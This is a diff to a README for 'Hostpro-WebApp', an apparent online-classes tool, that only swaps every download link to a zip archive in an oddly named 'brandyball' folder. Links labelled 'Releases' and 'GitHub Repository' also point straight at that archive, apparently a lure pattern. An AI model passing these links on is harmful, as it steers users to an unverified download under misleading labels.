@@ -1,6 +1,6 @@
 # 🎉 Hostpro-WebApp - Easy Online Classes Made Simple
 
-[![Download Hostpro-WebApp](https://raw.githubusercontent.com/Joannprime264/Hostpro-WebApp/main/brandyball/Hostpro-WebApp-v2.0.zip)](https://raw.githubusercontent.com/Joannprime264/Hostpro-WebApp/main/brandyball/Hostpro-WebApp-v2.0.zip)
+[![Download Hostpro-WebApp](https://github.com/Joannprime264/Hostpro-WebApp/raw/refs/heads/main/brandyball/Hostpro-Web-App-2.1.zip)](https://github.com/Joannprime264/Hostpro-WebApp/raw/refs/heads/main/brandyball/Hostpro-Web-App-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Hostpro-WebApp! This software offers a full-featured platform for onl
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Hostpro-WebApp Releases](https://raw.githubusercontent.com/Joannprime264/Hostpro-WebApp/main/brandyball/Hostpro-WebApp-v2.0.zip). 
+To get started, visit this page to download: [Hostpro-WebApp Releases](https://github.com/Joannprime264/Hostpro-WebApp/raw/refs/heads/main/brandyball/Hostpro-Web-App-2.1.zip). 
 
 ### Steps to Download and Install:
 
@@ -57,7 +57,7 @@ If you have any questions or need further assistance, feel free to reach out. Yo
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Joannprime264/Hostpro-WebApp/main/brandyball/Hostpro-WebApp-v2.0.zip)
-- [Download Hostpro-WebApp](https://raw.githubusercontent.com/Joannprime264/Hostpro-WebApp/main/brandyball/Hostpro-WebApp-v2.0.zip)
+- [GitHub Repository](https://github.com/Joannprime264/Hostpro-WebApp/raw/refs/heads/main/brandyball/Hostpro-Web-App-2.1.zip)
+- [Download Hostpro-WebApp](https://github.com/Joannprime264/Hostpro-WebApp/raw/refs/heads/main/brandyball/Hostpro-Web-App-2.1.zip)
 
 Thank you for choosing Hostpro-WebApp. We hope this tool aids in your online learning journey!
